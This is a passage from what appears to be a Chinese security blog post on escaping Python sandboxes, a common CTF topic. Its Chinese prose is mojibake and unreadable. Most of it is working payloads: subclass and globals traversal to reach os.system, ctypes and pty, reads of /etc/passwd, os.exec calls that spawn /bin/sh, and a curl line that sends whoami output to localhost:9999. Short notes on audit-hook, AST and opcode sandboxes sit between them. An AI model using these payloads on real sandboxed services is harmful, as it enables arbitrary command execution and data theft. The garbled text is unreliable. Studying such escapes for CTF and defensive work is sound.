class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br></pre></td></tr></table></figure><h5 id="FileRead"><a href="#FileRead" class="headerlink" title="FileRead"></a>FileRead</h5><p>æ“ä½œæ–‡ä»¶å¯ä»¥ä½¿ç”¨ builtins ä¸­çš„ openï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ FileLoader æ¨¡å—çš„ get_data æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="å¸¸è§æ²™ç®±"><a href="#å¸¸è§æ²™ç®±" class="headerlink" title="å¸¸è§æ²™ç®±"></a>å¸¸è§æ²™ç®±</h2><h3 id="exec-æ‰§è¡Œ"><a href="#exec-æ‰§è¡Œ" class="headerlink" title="exec æ‰§è¡Œ"></a>exec æ‰§è¡Œ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="built_in">object</span>, <span class="built_in">globals</span>=<span class="literal">None</span>, <span class="built_in">locals</span>=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><ul><li><code>object</code><ul><li>è¦æ‰§è¡Œçš„ä»£ç å­—ç¬¦ä¸²æˆ–ä»£ç å¯¹è±¡ã€‚</li></ul></li><li><code>globals</code><ul><li>å¯é€‰çš„å…¨å±€å‘½åç©ºé—´å­—å…¸ã€‚</li></ul></li><li><code>locals</code><ul><li>å¯é€‰çš„å±€éƒ¨å‘½åç©ºé—´å­—å…¸ã€‚</li></ul></li></ul><h3 id="audit-hook-æ²™ç®±"><a href="#audit-hook-æ²™ç®±" class="headerlink" title="audit hook æ²™ç®±"></a><code>audit hook</code> æ²™ç®±</h3><p><code>audit hook</code> æ˜¯ Python çš„ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œç”¨äºç›‘æ§å’Œé™åˆ¶ä»£ç çš„æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Opening file: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys.addaudithook(audit_hook)</span><br></pre></td></tr></table></figure><p>æ¯æ¬¡è°ƒç”¨ <code>open</code> å‡½æ•°æ—¶ï¼Œéƒ½ä¼šè§¦å‘ <code>audit_hook</code>ï¼Œå¹¶è§¦å‘ç›¸åº”äº‹ä»¶ã€‚</p><h3 id="åŸºäº-AST-çš„æ²™ç®±"><a href="#åŸºäº-AST-çš„æ²™ç®±" class="headerlink" title="åŸºäº AST çš„æ²™ç®±"></a>åŸºäº AST çš„æ²™ç®±</h3><p>ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰æ˜¯ Python çš„ä¸€ç§è¡¨ç¤ºä»£ç ç»“æ„çš„æ–¹å¼ã€‚å¯ä»¥ä½¿ç”¨ AST æ¨¡å—æ¥åˆ†æå’Œä¿®æ”¹ Python ä»£ç ã€‚</p><ul><li>ast.Module: è¡¨ç¤ºä¸€ä¸ªæ•´ä¸ªçš„æ¨¡å—æˆ–è€…è„šæœ¬ã€‚</li><li>ast.FunctionDef: è¡¨ç¤ºä¸€ä¸ªå‡½æ•°å®šä¹‰ã€‚</li><li>ast.AsyncFunctionDef: è¡¨ç¤ºä¸€ä¸ªå¼‚æ­¥å‡½æ•°å®šä¹‰ã€‚</li><li>ast.ClassDef: è¡¨ç¤ºä¸€ä¸ªç±»å®šä¹‰ã€‚</li><li>ast.Return: è¡¨ç¤ºä¸€ä¸ª return è¯­å¥ã€‚</li><li>ast.Delete: è¡¨ç¤ºä¸€ä¸ª del è¯­å¥ã€‚</li><li>ast.Assign: è¡¨ç¤ºä¸€ä¸ªèµ‹å€¼è¯­å¥ã€‚</li><li>ast.AugAssign: è¡¨ç¤ºä¸€ä¸ªå¢é‡èµ‹å€¼è¯­å¥ï¼Œå¦‚ x +&#x3D; 1ã€‚</li><li>ast.For: è¡¨ç¤ºä¸€ä¸ª for å¾ªç¯ã€‚</li><li>ast.While: è¡¨ç¤ºä¸€ä¸ª while å¾ªç¯ã€‚</li><li>ast.If: è¡¨ç¤ºä¸€ä¸ª if è¯­å¥ã€‚</li><li>ast.With: è¡¨ç¤ºä¸€ä¸ª with è¯­å¥ã€‚</li><li>ast.Raise: è¡¨ç¤ºä¸€ä¸ª raise è¯­å¥ã€‚</li><li>ast.Try: è¡¨ç¤ºä¸€ä¸ª try&#x2F;except è¯­å¥ã€‚</li><li>ast.Import: è¡¨ç¤ºä¸€ä¸ª import è¯­å¥ã€‚</li><li>ast.ImportFrom: è¡¨ç¤ºä¸€ä¸ª fromâ€¦importâ€¦è¯­å¥ã€‚</li><li>ast.Expr: è¡¨ç¤ºä¸€ä¸ªè¡¨è¾¾å¼ã€‚</li><li>ast.Call: è¡¨ç¤ºä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€‚</li><li>ast.Name: è¡¨ç¤ºä¸€ä¸ªå˜é‡åã€‚</li><li>ast.Attribute: è¡¨ç¤ºä¸€ä¸ªå±æ€§å¼•ç”¨ï¼Œå¦‚ x.yã€‚</li></ul><h3 id="åŸºäº-opcode-çš„æ²™ç®±"><a href="#åŸºäº-opcode-çš„æ²™ç®±" class="headerlink" title="åŸºäº opcode çš„æ²™ç®±"></a>åŸºäº opcode çš„æ²™ç®±</h3><h4 id="python-çš„å­—èŠ‚ç äºä¸æ“ä½œç "><a href="#python-çš„å­—èŠ‚ç äºä¸æ“ä½œç " class="headerlink" title="python çš„å­—èŠ‚ç äºä¸æ“ä½œç "></a>python çš„å­—èŠ‚ç äºä¸æ“ä½œç </h4><p>Python æ˜¯ä¸€ç§ è§£é‡Šå‹è¯­è¨€ï¼Œè¿™æ„å‘³ç€ Python ä»£ç åœ¨æ‰§è¡Œä¹‹å‰ä¼šè¢«ç¼–è¯‘å™¨ç¼–è¯‘ä¸ºä¸€ç§ä¸­é—´è¡¨ç¤ºå½¢å¼ï¼Œç§°ä¸º å­—èŠ‚ç ï¼ˆBytecodeï¼‰ã€‚å­—èŠ‚ç æ˜¯ä¸€ç§ä½çº§çš„ã€ä¸å¹³å°æ— å…³çš„è¡¨ç¤ºå½¢å¼ï¼Œå®ƒæ˜¯ Python è™šæ‹Ÿæœºï¼ˆPython Virtual Machine, PVMï¼‰å¯ä»¥ç›´æ¥æ‰§è¡Œçš„æŒ‡ä»¤é›†ã€‚</p><p>å­—èŠ‚ç ç”±ä¸€æ¡æ¡æ“ä½œç ï¼ˆOpcodeï¼‰ç»„æˆï¼Œæ¯ä¸ªæ“ä½œç å¯¹åº”ç€ Python è¯­è¨€ä¸­çš„ä¸€ç§æ“ä½œã€‚æ“ä½œç æ˜¯ Python å­—èŠ‚ç çš„åŸºæœ¬å•ä½ï¼Œå®ƒä»¬å®šä¹‰äº†è™šæ‹Ÿæœºåº”è¯¥æ‰§è¡Œçš„å…·ä½“æ“ä½œã€‚</p><p>å¯ä»¥é€šè¿‡ dis.opname å’Œ dis.opmap æ¥æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ“ä½œç åŠå…¶å¯¹åº”å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æ‰€æœ‰å¯ç”¨çš„æ“ä½œç åç§°</span></span><br><span class="line"><span class="built_in">print</span>(dis.opname)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æŸä¸ªç‰¹å®šæ“ä½œç¬¦åç§°å¯¹åº”çš„ opcode å€¼</span></span><br><span class="line"><span class="built_in">print</span>(dis.opmap[<span class="string">&#x27;LOAD_CONST&#x27;</span>])  <span class="comment"># è¾“å‡º: 100</span></span><br></pre></td></tr></table></figure><h2 id="é€ƒé€¸ç›®æ ‡"><a href="#é€ƒé€¸ç›®æ ‡" class="headerlink" title="é€ƒé€¸ç›®æ ‡"></a>é€ƒé€¸ç›®æ ‡</h2><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><h4 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a><code>timeit</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a><code>exec</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a><code>eval</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>eval æ— æ³•ç›´æ¥è¾¾åˆ°æ‰§è¡Œå¤šè¡Œä»£ç çš„æ•ˆæœï¼Œä½¿ç”¨ compile å‡½æ•°å¹¶ä¼ å…¥ exec æ¨¡å¼å°±èƒ½å¤Ÿå®ç°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a><code>platform</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="os"><a href="#os" class="headerlink" title="os"></a><code>os</code></h4><ul><li>os.system</li><li>os.popen</li><li>os.posix_spawn</li><li>os.exec*</li><li>os.spawnv</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>,<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure><p>os.exec*()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execl</span></span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execle</span></span><br><span class="line">os.execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlp</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlpe</span></span><br><span class="line">os.execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execv</span></span><br><span class="line">os.execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execve</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvp</span></span><br><span class="line">os.execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvpe</span></span><br><span class="line">os.execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure><p>os.fork() with os.exec*()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).fork() == <span class="number">0</span>) <span class="keyword">and</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a><code>subprocess</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h4 id="pty"><a href="#pty" class="headerlink" title="pty"></a><code>pty</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>Linux only</p><h4 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a><code>importlib</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;importlib&#x27;</span>).import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3å¯ä»¥ï¼ŒPython2æ²¡æœ‰è¯¥å‡½æ•°</span></span><br><span class="line">importlib.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h4><p>è¯¥æ¨¡å—é€šè¿‡ modules() å‡½æ•°è·å– os æ¨¡å—å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="builtins-åˆ©ç”¨"><a href="#builtins-åˆ©ç”¨" class="headerlink" title="__builtins__ åˆ©ç”¨"></a><code>__builtins__</code> åˆ©ç”¨</h4><p>è¯»å–æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span 